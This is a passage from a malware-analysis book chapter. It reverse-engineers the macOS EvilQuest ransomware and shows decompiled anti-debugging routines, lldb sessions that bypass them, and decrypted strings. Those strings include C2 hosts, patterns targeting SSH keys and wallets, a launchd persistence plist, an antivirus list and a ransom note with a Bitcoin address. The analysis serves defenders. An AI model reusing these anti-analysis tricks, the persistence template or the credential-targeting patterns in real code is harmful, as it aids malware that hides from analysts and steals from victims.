<pre><code>int is_debugging(int arg0, int arg1) {<br/> <br/>  int isDebugged = 0;<br/><br/>  mib[0] = CTL_KERN; <br/>  mib[1] = KERN_PROC; <br/>  mib[2] = KERN_PROC_PID; <br/>  mib[3] = getpid();<br/><br/>  sysctl(mib, 0x4, &amp;info, &amp;size, NULL, 0);<br/> <br/>  if(P_TRACED == (info.kp_proc.p_flag &amp; P_TRACED)) {<br/><span epub:type="pagebreak" id="Page_236" title="236"/>    isDebugged = 0x1;<br/>  }<br/> <br/>  return isDebugged;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing10-10">Listing 10-10</a>: Anti-debugging logic that uses <code>sysctl</code> and <code>P_TRACED</code></p>
<p>Code such as the <code>ei_persistence_main</code> function invokes the <code>is_debugging</code> function and promptly terminates if a debugger is detected (<a href="#listing10-11" id="listinganchor10-11">Listing 10-11</a>): </p>
<pre><code>int ei_persistence_main(...) {<br/><br/>  //debugger check<br/>  if (is_debugging(arg0, arg1) != 0) {<br/>    exit(1);<br/>  }</code></pre>
<p class="CodeListingCaption"><a id="listing10-11">Listing 10-11</a>: A premature exit if a debugger is detected</p>
<p>To circumvent this anti-analysis logic, we can either modify EvilQuest’s binary and patch out this code or use a debugger to subvert the malware’s execution state in memory. If you wanted to modify the code, you could replace the <code>cmovnz</code> instruction (at <code>0x0000000100007b7a</code>) with an instruction such as <code>xor eax, eax</code> to zero out the return value from the function. As this replacement instruction is one byte less than the <code>cmovnz</code>, you’ll have to add a one-byte NOP instruction for padding. </p>
<p>The debugging approach proves more straightforward, as we can simply zero out the return value from the <code>is_debugging</code> function. Specifically, we can first set a breakpoint on the instruction immediately following the call to the <code>is_debugging</code> function (<code>0x000000010000b89f</code>), which checks the return value via <code>cmp eax, 0x0</code>. Once the breakpoint is hit, we can set the <code>RAX</code> register to 0 with <code>reg write $rax 0</code>, leaving the malware blind to the fact that it’s being debugged:</p>
<pre><code>% <b>lldb patch</b><br/>(lldb) <b>target create "patch"</b><br/>...<br/><br/>(lldb) <b>b 0x10000b89f</b><br/>Breakpoint 1: where = patch`patch[00x000000010000b89f], address = 0x000000010000b89f<br/><br/>(lldb) <b>r</b><br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1<br/>-&gt;  0x10000b89f: cmpl   $0x0, %eax<br/>    0x10000b8a2: je     0x10000b8b2<br/><br/>(lldb) <b>reg read $rax</b><br/>       rax = 0x0000000000000001<br/><br/>(lldb) <b>reg write $rax 0</b><br/>(lldb) <b>c</b></code></pre>
<p><span epub:type="pagebreak" id="Page_237" title="237"/>We’re not quite done yet, as the malware also contains a function named <code>prevent_trace</code>, which, as the name suggests, attempts to prevent tracing via a debugger. <a href="#listing10-12" id="listinganchor10-12">Listing 10-12</a> shows the complete annotated disassembly of the function.</p>
<pre><code>prevent_trace:<br/>0x0000000100007c20    push       rbp <br/>0x0000000100007c21    mov        rbp, rsp<br/>0x0000000100007c24    call       getpid<br/>0x0000000100007c29    xor        ecx, ecx<br/>0x0000000100007c2b    mov        edx, ecx<br/>0x0000000100007c2d    xor        ecx, ecx<br/>0x0000000100007c2f    mov        edi, 0x1f ;PT_DENY_ATTACH<br/>0x0000000100007c34    mov        esi, eax  ;process id (pid)<br/>0x0000000100007c36    call     <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> ptrace <br/>0x0000000100007c3b    pop        rbp<br/>0x0000000100007c3c    ret</code></pre>
<p class="CodeListingCaption"><a id="listing10-12">Listing 10-12</a>: Anti-debugging logic via the <code>ptrace</code> API</p>
<p>After invoking the <code>getpid</code> function to retrieve its process ID, the malware invokes <code>ptrace</code> with the <code>PT_DENY_ATTACH</code> flag (<code>0x1f</code>) <span aria-label="annotation1" class="CodeAnnotation">1</span>. As noted in the previous chapter, this hinders debugging in two ways. First of all, once this call has been made, any attempt to attach a debugger will fail. Secondly, if a debugger is already attached, the process will immediately terminate after this call is made. </p>
<p>To subvert this logic so that the malware can be debugged to facilitate continued analysis, we again leverage the debugger to avoid the call to <code>prevent_trace</code> altogether. First we set a breakpoint at <code>0x000000010000b8b2</code>, which is a call that invokes this function. Once the breakpoint is hit, we modify the value of the instruction pointer (<code>RIP</code>) to point to the next instruction (at <code>0x000000010000b8b7</code>). This ensures the problematic call to <code>ptrace</code> is never executed.</p>
<p>Continued analysis reveals that all of EvilQuest’s anti-debugger functions are invoked from within a single function (<code>ei_persistence_main</code>). Thus, we can actually set a single breakpoint within the <code>ei_persistence_main</code> function and then modify the instruction pointer to jump past both anti-debugging calls. However, as the <code>ei_persistence_main</code> function is called multiple times, our breakpoint would be hit multiple times, requiring us to manually modify <code>RIP</code> each time. A more efficient approach would be to add a command to this breakpoint to instruct the debugger to automatically both modify <code>RIP</code> when the breakpoint is hit and then continue. </p>
<p>First let’s set a breakpoint at the <code>call is_debugging</code> instruction (found at <code>0x000000010000b89a</code>). Once the breakpoint is set we add a breakpoint command via <code>br command add</code>. In this command we can instruct the debugger to modify <code>RIP</code>, setting it to the address immediately following the call to the second anti-debugging function, <code>prevent_trace</code> (<code>0x000000010000b8b7</code>), as shown in <a href="#listing10-13" id="listinganchor10-13">Listing 10-13</a>:</p>
<pre><code> % <b>lldb patch</b><br/><br/>(lldb) <b>b 0x10000b89a</b><br/><span epub:type="pagebreak" id="Page_238" title="238"/>Breakpoint 1: where = patch`patch[0x000000010000b89a], address = 0x000000010000b89a<br/>(lldb) <b>br command add 1</b><br/>Enter your debugger command(s).  Type 'DONE' to end.<br/>&gt; <b>reg write $rip 0x10000b8b7 </b><br/>&gt; <b>continue</b><br/>&gt; <b>DONE</b></code></pre>
<p class="CodeListingCaption"><a id="listing10-13">Listing 10-13</a>: Bypassing anti-debugging logic with a breakpoint command</p>
<p>As we also added <code>continue</code> to our breakpoint command, the debugger will automatically continue execution once the instruction pointer has been modified. Once the breakpoint command has been added, both the call to <code>is_debugging</code> and the <code>prevent_trace</code> anti-debugging functions will be automatically skipped. With EvilQuest’s anti-analysis logic fully thwarted, our analysis can continue uninhibited. </p>
<h3 id="h2-501942c10-0009">Obfuscated Strings</h3>
<p class="BodyFirst">Back in the main function, the malware gathers some basic user information, such as the value of the <code>HOME</code> environment variable, and then it invokes a function named <code>extract_ei</code>. This function attempts to read <code>0x20</code> bytes of “trailer” data from the end of its on-disk binary image. However, as a function named <code>unpack_trailer</code> (invoked by <code>extract_ei</code>) returns 0 (false), a check for the magic value of <code>0xdeadface</code> fails:</p>
<pre><code>;rcx: trailer data<br/>0x0000000100004a39    cmp        dword ptr [rcx+8], 0xdeadface<br/>0x0000000100004a40    mov        [rbp+var_38], rax<br/>0x0000000100004a44    jz         notInfected</code></pre>
<p>Subsequent analysis will soon uncover the fact that the <code>0xdeadface</code> value is placed at the end of other binaries the malware infects. In other words, this is the malware checking whether it is running via a host binary that has been (locally) virally infected.</p>
<p>The function returning 0 causes the malware to skip certain repersistence logic that appears to persist the malware as a daemon:</p>
<pre><code>;rcx: trailer data<br/>;if no trailer data is found, this logic is skipped!<br/>if (extract_ei(*var_10, &amp;var_40) != 0x0) {<br/>   persist_executable_frombundle(var_48, var_40, var_30, *var_10);<br/>   install_daemon(var_30, ei_str("0hC|h71FgtPJ32afft3EzOyU3xFA7q0{LBx..."<span aria-label="annotation1" class="CodeAnnotation">1</span>), <br/>                  ei_str("0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD..."), 0x1);<br/><br/>   var_50 = ei_str("0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD1m6d3j0000073");<br/>   var_58 = ei_str("20HBC332gdTh2WTNhS2CgFnL2WBs2l26jxCi0000013");<br/>   var_60 = ei_str("1PbP8y2Bxfxk0000013");<br/>   ...<br/>   run_daemon_u(var_50, var_58, var_60);<br/>   ...<br/>   run_target(*var_10);<br/>}</code></pre>
<p><span epub:type="pagebreak" id="Page_239" title="239"/>It appears that various values of interest to us, such as the likely name and path of the daemon, are obfuscated <span aria-label="annotation1" class="CodeAnnotation">1</span>. As these obfuscated strings, and others in the code snippet, are all passed to the <code>ei_str</code> function, it seems reasonable to assume that this is the function responsible for string deobfuscation (<a href="#listing10-14" id="listinganchor10-14">Listing 10-14</a>):</p>
<pre><code>var_50 = ei_str("0hC|h71FgtPJ19|69c0m4GZL1xMqqS3kmZbz3FWvlD1m6d3j0000073");<br/>var_58 = ei_str("20HBC332gdTh2WTNhS2CgFnL2WBs2l26jxCi0000013");<br/>var_60 = ei_str("1PbP8y2Bxfxk0000013");</code></pre>
<p class="CodeListingCaption"><a id="listing10-14">Listing 10-14</a>: Obfuscated strings, passed to the <code>ei_str</code> function</p>
<p>Of course, we should verify our assumptions. Take a closer look at the decompilation of the <code>ei_str</code> function in <a href="#listing10-15" id="listinganchor10-15">Listing 10-15</a>: </p>
<pre><code>int ei_str(char* arg0) {<br/><br/>   var_10 = arg0;<br/>   if (*_eib_string_key == 0x0) {<br/>    <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> *eib_string_key = eip_decrypt(_eib_string_fa, 0x6b8b4567); <br/>   }<br/>   var_18 = 0x0;<br/>   rax = strlen();<br/>   rax = <span aria-label="annotation2" class="CodeAnnotationCode">2</span> eib_secure_decode(var_10, rax, *eib_string_key, &amp;var_18); <br/>   var_20 = rax;<br/>   if (var_20 == 0x0) {<br/>      var_8 = var_10;<br/>   }<br/>   else {<br/>      var_8 = var_20;<br/>   }<br/>   rax = var_8;<br/>   return rax;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing10-15">Listing 10-15</a>: The <code>ei_str</code> function, decompiled</p>
<p>This reveals a one-time initialization of a global variable named <code>eib_string_key</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>, followed by a call into a function named <code>eib_secure_decode</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>, which then calls a method named <code>tpdcrypt</code>. The decompilation also reveals that the <code>ei_str</code> function takes a single parameter (the obfuscated string) and returns its deobfuscated value.</p>
<p>As noted in <span class="xref" itemid="xref_target_Chapter 9">Chapter 9</span>, we don’t actually have to concern ourselves with the details of the deobfuscation or decryption algorithm. We can simply set a debugger breakpoint at the end of the <code>ei_str</code> function and print out the deobfuscated string held in the <code>RAX</code> register. This is illustrated below, where after setting a breakpoint at the start and end of the <code>ei_str </code>function, we are able to print out both the obfuscated string (<code>"1bGvIR16wpmp1uNjl83EMxn43AtszK1T6...HRCIR3TfHDd0000063"</code>) and its deobfuscated value, a template for the malware’s launch item persistence: </p>
<pre><code>% <b>lldb patch</b><br/>(lldb) <b>target create "patch"</b><br/><span epub:type="pagebreak" id="Page_240" title="240"/>...<br/><br/>(lldb) <b>b 0x100000c20</b><br/><b>Breakpoint 1: where</b><b> = patch`patch[0x0000000100000c20], address = 0x0000000100000c20</b><br/>(lldb) <b>b 0x100000cb5</b><br/>Breakpoint 2: where = patch`patch[0x0000000100000cb5], address = 0x0000000100000cb5<br/><br/>(lldb) <b>r</b><br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1<br/>-&gt;  0x100000c20: pushq  %rbp<br/>    0x100000c21: movq   %rsp, %rbp<br/><br/>(lldb) <b>x/s $rdi</b><br/>0x10001151f: "1bGvIR16wpmp1uNjl83EMxn43AtszK1T6...HRCIR3TfHDd0000063"<br/><br/>(lldb)<b> c</b><br/><br/>Process 1397 stopped<br/>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1<br/>-&gt;  0x100000cb5: retq<br/><br/>(lldb) <b>x/s $rax</b><br/>0x1002060d0: "&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;\n&lt;plist version="1.0"&gt;\n&lt;dict&gt;\n&lt;key&gt;Label&lt;/key&gt;\n&lt;string&gt;%s&lt;/string&gt;\n\n&lt;key&gt;ProgramArguments&lt;/key&gt;\n&lt;array&gt;\n&lt;string&gt;%s&lt;/string&gt;\n&lt;string&gt;--silent&lt;/string&gt;\n&lt;/array&gt;\n\n&lt;key&gt;RunAtLoad&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;key&gt;KeepAlive&lt;/key&gt;\n&lt;true/&gt;\n\n&lt;/dict&gt;\n&lt;/plist&gt;"</code></pre>
<p>The downside to this approach is that we’ll only decrypt strings when the malware invokes the <code>ei_str</code> function and our debugger breakpoint is hit. Thus, if an encrypted string is only referenced in blocks of code that aren’t executed, such as the persistence logic that is only invoked when the malware is executed from within an infected file, we won’t ever see its decrypted value.</p>
<p>For analysis purposes, it would be useful to coerce the malware to decrypt all these strings for us. Recall that in the last chapter we created an injectable dynamic library capable of exactly this. Specifically, once loaded into EvilQuest, it first resolves the address of the malware’s <code>ei_str</code> function and then invokes this function on all of the obfuscated strings embedded in the malware. In the last chapter, we showed an excerpt of this library’s output. <a href="#listing10-16" id="listinganchor10-16">Listing 10-16</a> shows it in its entirety: </p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib patch</b> <br/><br/>decrypted string (0x10eb675ec): andrewka6.pythonanywhere.com<br/>decrypted string (0x10eb67624): ret.txt<br/><br/>decrypted string (0x10eb67a95): *id_rsa*/i<br/>decrypted string (0x10eb67c15): *key*.png/i<br/>decrypted string (0x10eb67c35): *wallet*.png/i<br/><br/><span epub:type="pagebreak" id="Page_241" title="241"/>decrypted string (0x10eb6843f): /Library/AppQuest/com.apple.questd<br/>decrypted string (0x10eb68483): /Library/AppQuest<br/>decrypted string (0x10eb684af): %s/Library/AppQuest<br/>decrypted string (0x10eb684db): %s/Library/AppQuest/com.apple.questd<br/><br/>decrypted string (0x10eb6851f): <br/>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>&lt;key&gt;Label&lt;/key&gt;<br/>&lt;string&gt;%s&lt;/string&gt;<br/><br/>&lt;key&gt;ProgramArguments&lt;/key&gt;<br/>&lt;array&gt;<br/>&lt;string&gt;%s&lt;/string&gt;<br/>&lt;string&gt;--silent&lt;/string&gt;<br/>&lt;/array&gt;<br/><br/>&lt;key&gt;RunAtLoad&lt;/key&gt;<br/>&lt;true/&gt;<br/><br/>&lt;key&gt;KeepAlive&lt;/key&gt;<br/>&lt;true/&gt;<br/><br/>&lt;/dict&gt;<br/>&lt;/plist&gt;<br/><br/>decrypted string (0x10eb68817): NCUCKOO7614S<br/>decrypted string (0x10eb68837): 167.71.237.219<br/><br/>decrypted string (0x10eb6893f): Little Snitch<br/>decrypted string (0x10eb6895f): Kaspersky<br/>decrypted string (0x10eb6897f): Norton<br/>decrypted string (0x10eb68993): Avast<br/>decrypted string (0x10eb689a7): DrWeb<br/>decrypted string (0x10eb689bb): Mcaffee<br/>decrypted string (0x10eb689db): Bitdefender<br/>decrypted string (0x10eb689fb): Bullguard<br/><br/>decrypted string (0x10eb68b54): YOUR IMPORTANT FILES ARE ENCRYPTED<br/><br/>Many of your documents, photos, videos, images, and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your file without our decryption service.<br/>...<br/>Payment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the moment of payment. The address you have to make payment is:<br/><br/>decrypted string (0x10eb6939c): 13roGMpWd7Pb3ZoJyce8eoQpfegQvGHHK7<br/>decrypted string (0x10eb693bf): Your files are encrypted<br/><br/>decrypted string (0x10eb6997e): READ_ME_NOW<br/>...<br/><br/><span epub:type="pagebreak" id="Page_242" title="242"/>decrypted string (0x10eb69b6a): .doc<br/>decrypted string (0x10eb69b7e): .txt<br/>decrypted string (0x10eb69efe): .html</code></pre>
<p class="CodeListingCaption"><a id="listing10-16">Listing 10-16</a>: Decrypting all EvilQuest’s embedded strings</p>
<p>Among the decrypted output, we find many revealing strings:</p>
<ul>
<li>The addresses of servers, potentially used for command and control, like <em>andrewka6.pythonanywhere.com</em> and <em>167.71.237.219</em></li>
<li>Regular expressions perhaps pertaining to files of interest relating to keys, certificates, and wallets, like <code>*id_rsa*/i</code>, <code>*key*.pdf/i</code>, <code>*wallet*.pdf</code>, and so on</li>
<li>An embedded property list file likely used for launch item persistence</li>
<li>Names of security products such as Little Snitch and Kaspersky</li>
<li>Decryption instructions and file extensions for reported ransomware logic of the malware to target: <em>.zip</em>, <em>.doc</em>, <em>.txt</em>, and so on</li>
</ul>
<p>These decrypted strings provide more insight into many facets of the malware and will aid us in our continued analysis.</p>
<h2 id="h1-501942c10-0006">Up Next</h2>
<p class="BodyFirst">In this chapter we triaged EvilQuest and identified its anti-analysis code aimed at hampering analysis. We then looked at how to effectively sidestep this code so that our analysis could continue. In the next chapter we’ll continue our study of this complex malware, detailing its persistence and its multitude of capabilities. </p>
<h2 id="h1-501942c10-0007">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c10-noteref-1" id="c10-endnote-1">1</a></sup>	@dineshdina04, EvilQuest discovered, <em>Twitter</em>, <a class="LinkURL" href="https://twitter.com/dineshdina04/status/1277668001538433025/">https://twitter.com/dineshdina04/status/1277668001538433025/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c10-noteref-2" id="c10-endnote-2">2</a></sup>	Thomas Reed, “New Mac ransomware spreading through piracy,” <em>Malwarebytes Labs</em>, July 16, 2021, <a class="LinkURL" href="https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/">https://blog.malwarebytes.com/mac/2020/06/new-mac-ransomware-spreading-through-piracy/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c10-noteref-3" id="c10-endnote-3">3</a></sup>	Mixed In Key, <a class="LinkURL" href="https://mixedinkey.com/">https://mixedinkey.com/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c10-noteref-4" id="c10-endnote-4">4</a></sup>	Jonathan Levin, “Demystifying the DMG File Format,” June 12, 2013, <a class="LinkURL" href="http://newosxbook.com/DMG.html">http://newosxbook.com/DMG.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c10-noteref-5" id="c10-endnote-5">5</a></sup>	Clemens Kolbitsch, “Evasive Malware Tricks: How Malware Evades Detection by Sandboxes,” <em>ISACA Journal</em>, November 1, 2017, <a class="LinkURL" href="https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes/">https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes/</a>.</p></aside>
</section>
</body>
</html>